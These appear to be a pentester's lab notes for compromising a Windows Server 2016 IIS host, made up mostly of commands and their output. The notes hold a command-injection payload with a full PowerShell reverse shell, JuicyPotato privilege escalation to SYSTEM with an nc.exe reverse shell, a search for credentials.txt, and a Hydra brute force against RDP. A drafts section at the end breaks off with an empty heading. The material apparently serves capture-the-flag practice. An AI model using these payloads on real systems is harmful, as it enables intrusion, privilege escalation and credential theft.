---
created: 2026-09-18
updated: 2026-09-19
---
## I

- Port scanning:

```bash
sudo nmap -sV -p- --open 10.129.225.46 -Pn
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 10:03 EDT
Nmap scan report for 10.129.225.46
Host is up (0.084s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.25 seconds
```

- The server contains command injection vulnerability. Start a listener:

```bash
nc -lvnp 1337
```

- Plant a reverse shell:

```bash
localhost && powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.3',1337);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);(iex $d 2>&1|Out-String|%{[byte[]]([text.encoding]::ASCII).GetBytes($_)})|%{$s.Write($_,0,$_.Length)}};$c.Close()"   
```

```bash
Listening on 0.0.0.0 1337
Connection received on 10.129.225.46 49670
whoami
iis apppool\defaultapppool
```

### Privilege escalation

- Privileges:

```powershell
whoami /priv
```

```powershell
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- Build: 

```bash
wmic os get Caption,Version,BuildNumber,OSArchitecture
```

```bash
BuildNumber  Caption                                 OSArchitecture  Version     

14393        Microsoft Windows Server 2016 Standard  64-bit          10.0.14393 
```

- Download JuicyPotato:

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
```bash
python -m http.server 8082
```
```bash
powershell -c "Invoke-WebRequest -Uri http://10.10.14.3:8082/JuicyPotato.exe -OutFile C:\Windows\Temp\JuicyPotato.exe"
```

- Identify CLSID:

```powershell
reg query HKCR\CLSID /s /f LocalService
```

```powershell
HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
    LocalService    REG_SZ    winmgmt

End of search: 2 match(es) found.
```

```bash
.\JuicyPotato.exe -t * -p cmd.exe -l 1337
```

- Test target CLSID:

```bash
.\JuicyPotato.exe -z -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
```
```bash
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM
```

- Transfer `nc.exe`:

```bash
cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```
```bash
powershell -c "Invoke-WebRequest -Uri http://10.10.14.3:8082/nc.exe -OutFile C:\Windows\Temp\nc.exe"
```

- Start CMD as `SYSTEM`:

```bash
.\juicypotato.exe -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.3 4141" -t *  
```

- Catch the shell:

```bash
nc -lvnp 4141
Listening on 0.0.0.0 4141
Connection received on 10.129.225.46 49708
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

- Get KBs:

```bash
wmic qfe get HotFixID,InstalledOn,Description
Description      HotFixID   InstalledOn  
Update           KB3199986  11/21/2016   
Security Update  KB3200970  11/21/2016   


C:\Windows\system32>
```

```bash
where /r C:\ credentials.txt

```
## II



# drafts



- Attempt to crack RDP credentials using Hydra:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt rdp://10.129.225.46 -F -I
```
```bash
[3389][rdp] account on 10.129.225.46 might be valid but account not active for remote desktop: login: root password: 123456789, continuing attacking the account.
```

- RDP:

```bash
xfreerdp /v:10.129.225.46 /u:root /p:123456789 /dynamic-resolution +clipboard
```

## II

- Port scanning: